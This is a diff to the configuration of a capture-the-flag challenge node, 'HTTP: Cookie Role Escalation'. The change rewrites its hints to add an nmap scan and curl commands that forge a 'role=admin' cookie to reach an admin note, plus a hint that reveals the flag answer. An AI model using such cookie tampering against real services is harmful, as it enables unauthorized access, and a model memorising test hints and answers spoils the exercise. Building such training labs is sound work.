@@ -4,7 +4,7 @@ kind: flag-node-generator
 name: 'HTTP: Cookie Role Escalation'
 description: HTTP project console where a role cookie controls access to administrative
   notes.
-hint_template: Inspect the project console role cookie before moving to {{NEXT_NODE_NAME}}.
+hint_template: Consider whether the client controls the claimed role.
 runtime:
   type: docker-compose
   compose_file: docker-compose.yml
@@ -71,10 +71,23 @@ access_instructions:
     instructions: Record the flag from the admin note.
 hint_levels:
   low:
-  - Inspect the project console role cookie before moving to {{NEXT_NODE_NAME}}.
+  - Consider whether the client controls the claimed role.
   medium:
-  - 'File/artifact: {{OUTPUT.File(path):basename}}'
+  - 'Service: Cookie Role Escalation. Target: {{THIS_NODE_NAME}}; TCP port: {{OUTPUT.PortForward(host, port)}}.'
+  - |-
+    Check the assigned port:
+    ```bash
+    nmap -sT -sV -p {{OUTPUT.PortForward(host, port)}} {{THIS_NODE_NAME}}
+    ```
   high:
-  - Open the admin area as a normal user
-  - Set the role cookie to admin
-  - 'Record the role-gated note: Record the flag from the admin note.'
+  - 'Answer: {{OUTPUT.Flag(flag_id)}}'
+  - |-
+    Open the admin area as a normal user:
+    ```bash
+    curl -i http://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/admin
+    ```
+  - |-
+    Set the role cookie to admin:
+    ```bash
+    curl -H 'Cookie: role=admin' http://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/admin
+    ```
